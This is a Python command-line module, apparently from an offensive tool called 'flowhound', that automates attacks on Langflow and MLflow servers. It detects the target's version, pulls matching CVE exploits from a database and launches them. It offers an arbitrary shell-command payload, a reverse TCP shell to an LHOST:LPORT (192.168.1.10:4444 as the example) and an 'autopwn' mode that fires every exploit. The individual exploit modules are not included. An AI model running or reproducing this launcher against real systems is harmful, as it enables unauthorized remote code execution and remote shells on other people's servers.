import logging
from concurrent.futures import ThreadPoolExecutor
from concurrent.futures import TimeoutError as FutureTimeoutError

import click

from flowhound.cli.banner import banner
from flowhound.cli.validators import (
    validate_application,
    validate_authentication,
    validate_cve,
    validate_payload_args,
    validate_proxy,
    validate_url,
)
from flowhound.vulnerabilities.exploits.base_exploit_class import ExploitBaseClass
from flowhound.vulnerabilities.io.database import Database
from flowhound.vulnerabilities.io.version_detection import detect_target
from flowhound.vulnerabilities.payloads import PAYLOAD_MAP

EXPLOIT_TIMEOUT = ExploitBaseClass.TIMEOUT
logger = logging.getLogger(__name__)


def _get_payload(cmd: str | None, reverse_shell: str | None):
    parsed_reverse_shell = validate_payload_args(cmd=cmd, reverse_shell=reverse_shell)

    if cmd:
        logger.info(f"Using execute_bash_command payload: {cmd!r}")
        return PAYLOAD_MAP["command"](cmd=cmd)
    elif parsed_reverse_shell:
        lhost, lport = parsed_reverse_shell
        logger.info(f"Using reverse_tcp_shell payload: {lhost}:{lport}")
        return PAYLOAD_MAP["reverse_shell"](lhost=lhost, lport=lport)

    return None


def _execute_exploit(
    exploit_module,
    base_url: str,
    username: str,
    password: str,
    proxies: dict[str, str] | None,
    payload,
    timeout: int = EXPLOIT_TIMEOUT,
) -> bool:
    """
    Executes an exploit module with a cross-platform timeout.
    """
    with ThreadPoolExecutor(max_workers=1) as executor:
        future = executor.submit(
            exploit_module.exploit,
            base_url=base_url,
            username=username,
            password=password,
            proxies=proxies,
            payload=payload,
        )
        return future.result(timeout=timeout)


def _detect_or_fail(
    url: str, proxy: dict[str, str] | None, application: str | None
) -> tuple[str, str]:
    try:
        app, version = detect_target(
            base_url=url, proxies=proxy, application=application
        )
    except RuntimeError as e:
        raise click.ClickException(f"Error detecting target: {e}")

    logger.info(f"Detected {app} version {version}.")
    return app, version


def _get_vulnerabilities(
    db: Database,
    application: str,
    target_version: str,
    is_auth: bool,
    cve: str | None = None,
) -> list:
    try:
        if cve:
            return db.search_vulnerabilities(cve=cve)
        return db.retrieve_vulnerabilities(
            application=application,
            target_version=target_version,
            is_auth=is_auth,
        )
    except (ValueError, RuntimeError) as e:
        raise click.ClickException(f"Error retrieving exploits: {e}")


def _run_exploits(
    vuln_lst: list,
    url: str,
    username: str,
    password: str,
    proxy: dict[str, str] | None,
    payload,
    autopwn: bool,
) -> None:
    logger.info(
        f"{len(vuln_lst)} exploit(s) detected. Prioritizing unauth RCE exploits."
    )
    for vuln in vuln_lst:
        click.echo("")
        logger.info(
            f"Launching exploit for {vuln.cve_id} that impacts {vuln.application} versions {vuln.min_impacted_version} through {vuln.max_impacted_version}"
        )
        exploit_module = vuln.get_exploit_instance()

        try:
            result = _execute_exploit(
                exploit_module=exploit_module,
                base_url=url,
                username=username,
                password=password,
                proxies=proxy,
                payload=payload,
            )
        except FutureTimeoutError:
            logger.warning(
                f"Exploit for {vuln.cve_id} timed out after {EXPLOIT_TIMEOUT}s. Skipping."
            )
            result = False

        if not autopwn and result:
            logger.info("Exploitation successful. Stopping at first attempt.")
            break


@click.command(help="Launch one or more exploits against a target instance.")
@click.option(
    "--url", required=True, help="URL of target instance", callback=validate_url
)
@click.option("--username", required=False, default="", help="Target instance username")
@click.option("--password", required=False, default="", help="Target instance password")
@click.option(
    "--autopwn",
    required=False,
    is_flag=True,
    default=False,
    help="Launch all available exploits, instead of stopping at first successful attempt.",
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--command",
    "cmd",
    required=False,
    default=None,
    help="Shell command to execute on the target (uses execute_bash_command payload).",
)
@click.option(
    "--reverse_shell",
    required=False,
    default=None,
    help="LHOST:LPORT for a reverse TCP shell payload (e.g. 192.168.1.10:4444).",
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.option(
    "--cve",
    required=False,
    default=None,
    help="Target a specific CVE (e.g. CVE-2024-1234). Limits exploitation to that CVE only.",
    callback=validate_cve,
)
@click.pass_context
def attack(
    ctx: click.Context,
    url: str,
    username: str,
    password: str,
    autopwn: bool,
    proxy: dict[str, str] | None,
    cmd: str | None,
    reverse_shell: str | None,
    application: str | None,
    cve: str | None,
):
    banner()
    db: Database = ctx.obj
    payload = _get_payload(cmd=cmd, reverse_shell=reverse_shell)
    has_credentials = validate_authentication(username=username, password=password)

    application, target_version = _detect_or_fail(
        url=url, proxy=proxy, application=application
    )

    if has_credentials:
        logger.warning(
            f"{application} login credentials detected. Results will include Auth RCE exploit modules."
        )

    vuln_lst = _get_vulnerabilities(
        db=db,
        application=application,
        target_version=target_version,
        is_auth=has_credentials,
        cve=cve,
    )

    _run_exploits(
        vuln_lst=vuln_lst,
        url=url,
        username=username,
        password=password,
        proxy=proxy,
        payload=payload,
        autopwn=autopwn,
    )


@click.command(help="Detect target application and list known exploits.")
@click.option(
    "--url",
    required=True,
    help="URL of target instance",
    callback=validate_url,
)
@click.option(
    "--proxy",
    required=False,
    default=None,
    help="HTTP(s) proxy to use for network I/O operations",
    callback=validate_proxy,
)
@click.option(
    "--application",
    required=False,
    default=None,
    help="Target application name (e.g. langflow, mlflow). Skips auto-detection when provided.",
    callback=validate_application,
)
@click.pass_context
def sniff(
    ctx: click.Context, url: str, proxy: dict[str, str] | None, application: str | None
):
    db: Database = ctx.obj

    application, target_version = _detect_or_fail(
        url=url, proxy=proxy, application=application
    )

    logger.info(
        f"Retrieving all known exploits for {application} version {target_version}:"
    )
    vuln_lst = _get_vulnerabilities(
        db=db, application=application, target_version=target_version, is_auth=True
    )

    for vuln in vuln_lst:
        logger.info(vuln.exploit_module)
